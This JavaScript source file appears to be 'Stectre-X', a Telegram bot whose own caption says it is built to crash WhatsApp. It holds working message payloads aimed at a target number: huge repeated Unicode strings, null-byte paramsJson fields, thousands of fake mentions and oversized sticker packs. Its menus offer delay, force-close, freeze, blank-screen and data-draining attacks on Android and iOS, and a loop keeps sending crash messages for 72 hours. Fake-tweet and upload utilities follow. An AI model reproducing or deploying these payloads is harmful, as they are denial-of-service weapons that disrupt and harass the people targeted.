            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            jpegThumbnail: null,
            scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
            scanLengths: [2437, 17332],
            contextInfo: {
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true
            }
          }
        },
        annotations: [
          {
            embeddedContent: {
              X 
            },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", tmsg.message, {
    messageId: tmsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: tmsg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined
        }
      ]
    });
  }
}


async function FaiqFcIos(sock, target) {
      sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Faiq" + "ꦻ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
    
    async function fcAyos(target) {
  for (let i = 0; i < 1; i++) {
    try {
      const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            extendedTextMessage: {
              text: "🩸hanxzz the availability",
              contextInfo: {
                mentionedJid: [target, "5521992999999@s.whatsapp.net"],
                forwardingScore: 999,
                isForwarded: false,
                contextInfo: {
                stanzaId: "FTG-EE62BD88F22C",
                participant: "5521992999999@s.whatsapp.net",
                remoteJid: target,
                quotedMessage: {
                  callLogMessage: {
                    isVideo: false,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1"
                      }
                    ]
                  }
                }
              }
            }
           }
         }
       }
      }, {
        quoted: messageKontol 
      });

      await sock.relayMessage(target, msg.message, {
        messageId: msg.key.id
      });

    } catch (err) {
      console.error("Function error:", err.message);
    }
  }
}

const messageKontol = {
  key: {
    remoteJid: "5521992999999@s.whatsapp.net",
    fromMe: false,
    id: "CALL_MSG_" + Date.now(),
    participant: "5521992999999@s.whatsapp.net"
  },
  message: {
    callLogMessage: {
      isVideo: true,
      callOutcome: "1",
      durationSecs: "0",
      callType: "REGULAR",
      participants: [
        {
          jid: "5521992999999@s.whatsapp.net",
          callOutcome: "1"
        }
      ]
    }
  }
};

async function threepelDelayInvis(sock, target) {
  const mentionedJids = [
    "1355514232@s.whatsapp.net",
    ...Array.from({ length: 1999 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
  ];
  const additionalNodes = [
    {
      tag: "meta",
      attrs: {},
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: { jid: target }
            }
          ]
        }
      ]
    }
  ];
  const msg1 = {
    viewOnceMessage: {
      message: {
        lottieStickerMessage: {
          message: {
            stickerMessage: {
              url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
              fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
              fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
              mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
              mimetype: "application/was",
              height: 512,
              width: 512,
              directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
              fileLength: 14390,
              mediaKeyTimestamp: 1760786856,
              isAnimated: true,
              stickerSentTs: 1760786855983,
              isLottie: true,
              contextInfo: {
                mentionedJid: mentionedJids
              }
            }
          }
        }
      }
    }
  };
  const msg2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "xyz", format: "DEFAULT" },
          contextInfo: { mentionedJid: mentionedJids },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        }
      }
    }
  };
  const msg3 = {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "1e66102f-2c7c-4bb9-80cf-811e922bd1a8",
          name: "ꦴꦿ".repeat(99000),
          publisher: "",
          stickers: Array.from({ length: 20000 }, () => ({
            url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
            fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
            fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
            mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
            mimetype: "application/webp",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
            fileLength: 14390,
            mediaKeyTimestamp: 1760786856,
            isAnimated: true,
            stickerSentTs: 1760786855983,
            isLottie: true,
            contextInfo: { mentionedJid: mentionedJids }
          })),
          contextInfo: { mentionedJid: mentionedJids },
          fileLength: "8020935",
          fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
          fileEncSha256: "2KwixOJtpl4ivq8HMgTQGICW+HMxLnZuQmUN6KPD4kg=",
          mediaKey: "i4I6325nsuHeYhj4KuyeZ+8bHAxE6A5Rt5uzyNRIaTk=",
          directPath: "/v/t62.15575-24/23212937_564001070100700_5740166209540264226_n.enc?ccb=11-4&oh=01_Q5Aa1wFfJ2yPLT287gHgeKwk1Ifh1jowuwT0trU3-hyqosIQoQ&oe=686EC6A7&_nc_sid=5e03e0",
          stickerPackSize: "15000000000",
          stickerPackOrigin: "USER_CREATED"
        }
      }
    }
  };
  for (const el of [msg1, msg2, msg3]) {
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject(el), {});
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes
    });
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: { key: msg.key, type: 25 }
          }
        }
      },
      { additionalNodes }
    );
    await new Promise((resolve) => setTimeout(resolve, 500));
  }
}

async function DelayMarkKontol(target, mention, sock) {
  const message1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "</⃟༑⌁⃰ ི꒦ྀ𝐘͢Ц͡𝐍͜Λ͢Λ͡ :: 404.Σ𝖃Σꦾ⃟🕊", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
          ),
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
      },
    },
  };

  const audioMessage2 = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: [
          "6285215587498@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
          ),
        ],
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message1, audioMessage2, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sock.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " </⃟༑⌁⃰ ི꒦ྀ𝐘͢Ц͡𝐍͜Λ͢Λ͡ :: 404.Σ𝖃Σꦾ⃟🕊 "
            },
            content: undefined
          }
        ]
      }
    );
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/webp",
          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
          fileLength: "1173741824",
          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
          mediaKeyTimestamp: "1743225419",
          isAnimated: false,
          viewOnce: false,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "#</⃟༑⌁⃰ ི꒦ྀ𝐘͢Ц͡𝐍͜Λ͢Λ͡ :: 404.Σ𝖃Σꦾ⃟🕊", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(99999),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  const stickerMsgFinal = generateWAMessageFromContent(target, stickerMsg, {});

  await sock.relayMessage("status@broadcast", stickerMsgFinal.message, {
    messageId: stickerMsgFinal.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}


// END FUNCTION
async function comboyanz(sock, durationHours = 72) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  while (Date.now() - startTime < totalDurationMs) {
    try {
      if (count < 700) {
        // Panggilan ke fungsi pengirim pesan
        await Poseidon(sock, target);
        await InvisibleDelay(sock, jid);
        await Evoblank(target);
        await BlankUi(target);
        await FaiqFcNoClick(target);
        await trashprotocol(target, mention);
        await DelayInvisV1(sock, target);
        await BrutDelay(sock, target);
        await ComboAttack(sock, target);

        console.log(chalk.yellow(`Proses kirim bug sampai ${count + 1}/700 jid> ${jid}`));
        count++;
      } else {
        console.log(chalk.green(`[✓] Success Send Bug 700 Messages to ${jid}`));
        count = 0;
        console.log(chalk.red("➡️ Next 700 Messages"));
      }

      // Delay 100ms antar pengiriman
      await new Promise(resolve => setTimeout(resolve, 100));
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  }

  console.log(`Stopped after running for 3 days. Total messages sent in last batch: ${count}`);
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};



bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = String(msg.from.id);
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";

  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  const premiumStatus = getPremiumStatus(senderId);

  // Ambil sisa cooldown user (ms)
  const msLeft = checkCooldown(senderId);

  // Jika masih cooldown → formatSeconds/Minutes/Hours
  const cooldownStatus = msLeft > 0 
      ? formatCooldownMs(msLeft)
      : "No Cooldown";

  try {
    await bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>[ 👻 ] Ólā ${username}¿ — #Stectre-X – Invis
私は WhatsApp をクラッシュさせることを目的とした Telegram ボットです</blockquote>

<blockquote>( 𖤐 ) 『 Bot ↓ Information 』</blockquote>
✧ Bot Name : #Stectre-X - Invis
✧ Author : Dkk Stectre-X
✧ Version : 1.0
✧ Username : ${username}
✧ Premium Statue's : ${premiumStatus}

<blockquote>[ 🔮 ] 『 Status ↓ Information 』</blockquote>
✧ Sender Statue's : ${getWhatsAppStatus()}
✧ Memory Statue's : ${getNodeModulesSize()}
✧ Runtime Statue's : ${runtime}
✧ Cooldown Statue's : ${cooldownStatus}

<blockquote>© #𝑺𝒕𝒆𝒄𝒕𝒓𝒆-𝑿</blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "( ⚙️ ) - 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮", callback_data: "owner_menu" },
            { text: "( ☠️ ) - 𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "trashmenu" }
          ],
          [
            { text: "( 🧿 ) - 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", callback_data: "tqto" },
            { text: "( 🛠️ ) - 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮", callback_data: "tools_menu" }
          ],
          [
            { text: "🚨 - 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢", url: "https://t.me/agheobotz" },
            { text: "🪫 - 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", url: "https://t.me/Jangansoasikdeh" }
          ]
        ]
      }
    });

    await bot.sendAudio(chatId, "https://files.catbox.moe/kzof8r.mp3", {
      caption: `<blockquote>[ 🦹🏽‍♂️ ] 𝐒𝐭𝐞𝐜𝐭𝐫𝐞-𝐗 𝐕𝟏</blockquote>`,
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("❌ Error saat kirim start:", error);
  }
});
bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();
    
   // Ambil sisa cooldown user (ms)
  const msLeft = checkCooldown(senderId);

  // Jika masih cooldown → formatSeconds/Minutes/Hours
  const cooldownStatus = msLeft > 0 
      ? formatCooldownMs(msLeft)
      : "No Cooldown";

    let caption = "";
    let replyMarkup = {};

   if (query.data === "trashmenu") {
  caption = `
<blockquote>( 𖤐 ) 『 Bot ↓ Information 』</blockquote>
✧ Bot Name : #Stectre-X - Invis
✧ Author : Dkk Stectre-X
✧ Version : 1.0
✧ Username : ${username}
✧ Premium Statue's : ${premiumStatus}

<blockquote>[ 🔮 ] 『 Status ↓ Information 』</blockquote>
✧ Sender Statue's : ${getWhatsAppStatus()}
✧ Memory Statue's : ${getNodeModulesSize()}
✧ Runtime Statue's : ${runtime}
✧ Cooldown Statue's : ${cooldownStatus}

<blockquote>[ ☠️ ] 『 Bug ↓ Menu 』</blockquote>
✧ /delay nomor
  -Delay Hard
✧ /delayinvisible nomor
  -Delay invisible
✧ /delaybeta nomor
  -Delay Beta
✧ /force nomor
  -Force Close
✧ /crashui nomor  
  -Crasher Hard
✧ /blank nomor
  -Freze And Blank Hard
✧ /xcombo nomor
  -Combo Brutal
✧ /buldo nomor
  -Efek Sedot Kuota
`;

  replyMarkup = {
    inline_keyboard: [
      [{ text: "( ➡️ ) 𝐍𝐄𝐗𝐓", callback_data: "bug2_menu" }],
      [{ text: "( ⬅️ ) - 𝐁𝐀𝐂𝐊", callback_data: "back_to_main" }]
    ]
  };
}
    
       if (query.data === "bug2_menu") {
      caption = `
<blockquote>( 𖤐 ) 『 Bot ↓ Information 』</blockquote>
✧ Bot Name : #Stectre-X - Invis
✧ Author : Dkk Stectre-X
✧ Version : 1.0
✧ Username : ${username}
✧ Premium Statue's : ${premiumStatus}

<blockquote>[ 🔮 ] 『 Status ↓ Information 』</blockquote>
✧ Sender Statue's : ${getWhatsAppStatus()}
✧ Memory Statue's : ${getNodeModulesSize()}
✧ Runtime Statue's : ${runtime}
✧ Cooldown Statue's : ${cooldownStatus}

<blockquote>[ ⚙️ ] 『 Bug ↓ Menu2 』</blockquote>
✧ /blankiphone nomor
  -Efek blank iphone
✧ /freezeiphone nomor
  -Efek freeze iphone
✧ /invisibleios nomor
  -Efek delay ios
✧ /crashiphone nomor
  -Efek crash ios
✧ /forceios nomor
  -Efek forclose ios
`;
      replyMarkup = { inline_keyboard: [[{ text: "( ⬅️ ) - 𝐁𝐀𝐂𝐊", callback_data: "back_to_main" }]] };
    }
    
   
    if (query.data === "tqto") {
      caption = `
<blockquote>( 𖤐 ) 『 Bot ↓ Information 』</blockquote>
✧ Bot Name : #Stectre-X - Invis
✧ Author : Dkk Stectre-X
✧ Version : 1.0
✧ Username : ${username}
✧ Statue's : ${premiumStatus}

<blockquote>[ 🔮 ] 『 Status ↓ Information 』</blockquote>
✧ Sender Statue's : ${getWhatsAppStatus()}
✧ Memory Statue's : ${getNodeModulesSize()}
✧ Runtime Statue's : ${runtime}

<blockquote>[ 🧛🏻‍♂️ ] 『 Thanks ↓ To 』</blockquote>
@Jangansoasikdeh ( 𝘿𝙚𝙫 𝙪 ) 
@YanzxJawa ( 𝙙𝙚𝙫 2 ) 
@FaiqNotDev ( 𝙨𝙪𝙥𝙥𝙤𝙧𝙩 ) 
@FaiqNotDev2 ( 𝙨𝙪𝙥𝙥𝙤𝙧𝙩 ) 
@Dyshaha ( 𝙨𝙪𝙥𝙥𝙤𝙧𝙩 ) 
@Fionacantikwoe ( 𝙨𝙪𝙥𝙥𝙤𝙧𝙩 ) 
    `;
      replyMarkup = { inline_keyboard: [[{ text: "( ⬅️ ) - 𝐁𝐀𝐂𝐊", callback_data: "back_to_main" }]] };
    }
    

    

    if (query.data === "owner_menu") {
      caption = `
<blockquote>( 𖤐 ) 『 Bot ↓ Information 』</blockquote>
✧ Bot Name : #Stectre-X - Invis
✧ Author : Dkk Stectre-X
✧ Version : 1.0
✧ Username : ${username}
✧ Premium Statue's : ${premiumStatus}

<blockquote>[ 🔮 ] 『 Status ↓ Information 』</blockquote>
✧ Sender Statue's : ${getWhatsAppStatus()}
✧ Memory Statue's : ${getNodeModulesSize()}
✧ Runtime Statue's : ${runtime}
✧ Cooldown Statue's : ${cooldownStatus}

<blockquote>[ ⚙️ ] 『 Owner ↓ Menu 』</blockquote>
✧ /listprem
✧ /addprem
✧ /delprem
✧ /addadmin
✧ /deladmin
✧ /listadmin
✧ /update
✧ /restart
✧ /setcd
✧ /addsender`;
      replyMarkup = { inline_keyboard: [[{ text: "( ⬅️ ) - 𝐁𝐀𝐂𝐊", callback_data: "back_to_main" }]] };
    }
    


 if (query.data === "tools_menu") {
      caption = `
<blockquote>( 𖤐 ) 『 Bot ↓ Information 』</blockquote>
✧ Bot Name : #Stectre-X - Invis
✧ Author : Dkk Stectre-X
✧ Version : 1.0
✧ Username : ${username}
✧ Premium Statue's : ${premiumStatus}

<blockquote>[ 🔮 ] 『 Status ↓ Information 』</blockquote>
✧ Sender Statue's : ${getWhatsAppStatus()}
✧ Memory Statue's : ${getNodeModulesSize()}
✧ Runtime Statue's : ${runtime}
✧ Cooldown Statue's : ${cooldownStatus}

<blockquote>[ 🛠️ ] 『 Tools ↓ Menu 』</blockquote>
✧ /tourl
✧ /info
✧ /ustad
✧ /brat
✧ /iqc
✧ /gethtml
✧ /trackip
✧ /nikparse
✧ /enchtml
✧ /fixcode
✧ /pinterest
✧ /spotifysearch
✧ /ppla
✧ /tiktok`;
      replyMarkup = { inline_keyboard: [[{ text: "( ⬅️ ) - 𝐁𝐀𝐂𝐊", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `
<blockquote>[ 👻 ] Ólā ${username}¿ — #Stectre-X – Invis
私は WhatsApp をクラッシュさせることを目的とした Telegram ボットです</blockquote>

<blockquote>( 𖤐 ) 『 Bot ↓ Information 』</blockquote>
✧ Bot Name : #Stectre-X - Invis
✧ Author : Dkk Stectre-X
✧ Version : 1.0
✧ Username : ${username}
✧ Premium Statue's : ${premiumStatus}

<blockquote>[ 🔮 ] 『 Status ↓ Information 』</blockquote>
✧ Sender Statue's : ${getWhatsAppStatus()}
✧ Memory Statue's : ${getNodeModulesSize()}
✧ Runtime Statue's : ${runtime}
✧ Cooldown Statue's : ${cooldownStatus}

<blockquote>© #𝑺𝒕𝒆𝒄𝒕𝒓𝒆-𝑿</blockquote>`;
      replyMarkup = {
  inline_keyboard: [
    [
           { text: "( ⚙️ ) - 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮", callback_data: "owner_menu" },
            { text: "( ☠️ ) - 𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "trashmenu" }
          ],
          [
            { text: "( 🧿 ) - 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨", callback_data: "tqto" }, 
            { text: "( 🛠️ ) - 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮", callback_data: "tools_menu" }
          ],
          [
            { text: "🚨 - 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢", url: "https://t.me/agheobotz" },
            { text: "🪫 - 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", url: "https://t.me/Jangansoasikdeh" }
    ]
  ]
};
}
    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
//=======TOOLS DI SINI=========//
// =====================================
//  Fitur /faketweet
// =====================================
bot.onText(/\/faketweet (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    let text = match[1];
    let [name, ...tweetArr] = text.split("|");
    let tweet = tweetArr.join("|");

    if (!name || !tweet) {
      return bot.sendMessage(
        chatId,
        "⚠️ *Format salah!*\n\nGunakan:\n`/faketweet nama|teks`\n\nContoh:\n`/faketweet Elon Musk|I love coding!`",
        { parse_mode: "Markdown" }
      );
    }

    // =====================================
    // LOADING ANIMASI BARU (ROTATING)
    // =====================================
    const loadingFrames = ["⏳", "🔄", "🌀", "🔁"];
    let loadingIndex = 0;

    let loadingMsg = await bot.sendMessage(
      chatId,
      `${loadingFrames[0]} Membuat tweet palsu...`
    );

    let loadingInterval = setInterval(() => {
      loadingIndex = (loadingIndex + 1) % loadingFrames.length;
      bot.editMessageText(
        `${loadingFrames[loadingIndex]} Sedang membuat tweet...`,
        {
          chat_id: chatId,
          message_id: loadingMsg.message_id
        }
      );
    }, 450);

    // =====================================
    // REQUEST API
    // =====================================
    const apiUrl = `https://api.deline.web.id/maker/faketweet2?name=${encodeURIComponent(
      name
    )}&text=${encodeURIComponent(tweet)}`;

    const response = await fetch(apiUrl);
    const result = await response.json();

    // Stop animasi loading
    clearInterval(loadingInterval);

    if (!result.status || !result.url) {
      return bot.editMessageText("❌ Gagal membuat tweet!", {
        chat_id: chatId,
        message_id: loadingMsg.message_id
      });
    }

    // =====================================
    // EDIT PESAN MENJADI BERHASIL
    // =====================================
    await bot.editMessageText(
      "✅ Tweet berhasil dibuat! Mengirim gambar...",
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id
      }
    );

    // =====================================
    // KIRIM FOTO
    // =====================================
    await bot.sendPhoto(chatId, result.url, {
      caption: `🧵 *Fake Tweet*\n\n👤 Nama: *${name}*\n📝 Teks: ${tweet}`,
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat memproses tweet."
    );
  }
});


bot.onText(/^\/iqc(?:\s+([\s\S]+))?$/, async (msg, match) => {
    const chatId = msg.chat.id;
    let placeholder;

    try {
        const args = match[1];
        if (!args) {
            return bot.sendMessage(chatId, "Teks lu mana?\nFormat: /iqc time,battery,message");
        }

        let [time, battery, message] = args.split(",");
        time = time || new Date().toLocaleTimeString();
        battery = battery || "100";
        message = message || "…";

        // Pesan loading
        placeholder = await bot.sendMessage(chatId, "wet..");

        // URL API
        let url = `https://piereeapi.vercel.app/tools/iqc?time=${encodeURIComponent(time)}&battery=${encodeURIComponent(battery)}&message=${encodeURIComponent(message)}`;

        // Fetch API dengan timeout
        let res;
        try {
            res = await fetchWithTimeout(url, 15000);
        } catch (err) {
            await bot.deleteMessage(chatId, placeholder.message_id);
            return bot.sendMessage(chatId, "⚠️ API Timeout / Tidak Merespon.");
        }

        if (!res.ok) {
            await bot.deleteMessage(chatId, placeholder.message_id);
            return bot.sendMessage(chatId, "⚠️ API Error / Server Bermasalah.");
        }

        let buffer = Buffer.from(await res.arrayBuffer());
        if (!buffer) {
            await bot.deleteMessage(chatId, placeholder.message_id);
            return bot.sendMessage(chatId, "⚠️ Server tidak mengirimkan gambar.");
        }

        // Kirim gambar ke user
        await bot.sendPhoto(chatId, buffer, {
            reply_to_message_id: placeholder.message_id
        });

        // Hapus placeholder
        await bot.deleteMessage(chatId, placeholder.message_id);

    } catch (err) {
        console.error("IQC ERROR:", err);

        if (placeholder) {
            try { await bot.deleteMessage(chatId, placeholder.message_id); } catch {}
        }

        bot.sendMessage(chatId, "⚠️ Terjadi kesalahan dek.");
    }
});

bot.onText(/^\/brat(?:\s+([\s\S]+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const inputText = match[1];

  if (!inputText) {
    return bot.sendMessage(chatId, "❗ *Gunakan:* `/brat teksnya`\nContoh: `/brat aku lagi bete`", { parse_mode: "Markdown" });
  }

  try {
    bot.sendMessage(chatId, "⏳ Sedang membuat brat style...");

    const apiUrl = `https://piereeapi.vercel.app/tools/brat?text=${encodeURIComponent(inputText)}`;

    const { data } = await axios.get(apiUrl, {
      responseType: "arraybuffer"
    });

    await bot.sendPhoto(chatId, data, {
      caption: `✨ *Brat Generator*\n\nTeks: _${inputText}_`,
      parse_mode: "Markdown"
    });

  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat gambar brat.");
  }
});

bot.onText(/\/tourl/, async (msg) => {
    const chatId = msg.chat.id;

    // Cek apakah reply ke media
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, "⚠️ Reply file/foto/video/audio/voice yang ingin di-upload, lalu ketik /tourl");
    }

  
    

    const reply = msg.reply_to_message;

    // Kirim reaksi loading
    const loadingMsg = await bot.sendMessage(chatId, "🍁 Sedang mengupload...");

    try {
        let fileId, fileName, fileSize, mimeType;

        // Deteksi tipe media
        if (reply.document) {
            fileId = reply.document.file_id;
            fileName = reply.document.file_name || `file_${Date.now()}`;
            fileSize = reply.document.file_size;
            mimeType = reply.document.mime_type;
        } else if (reply.photo) {
            const photo = reply.photo[reply.photo.length - 1];
            fileId = photo.file_id;
            fileName = `photo_${Date.now()}.jpg`;
            fileSize = photo.file_size;
            mimeType = 'image/jpeg';
        } else if (reply.video) {
            fileId = reply.video.file_id;
            fileName = `video_${Date.now()}.mp4`;
            fileSize = reply.video.file_size;
            mimeType = reply.video.mime_type || 'video/mp4';
        } else if (reply.audio) {
            fileId = reply.audio.file_id;
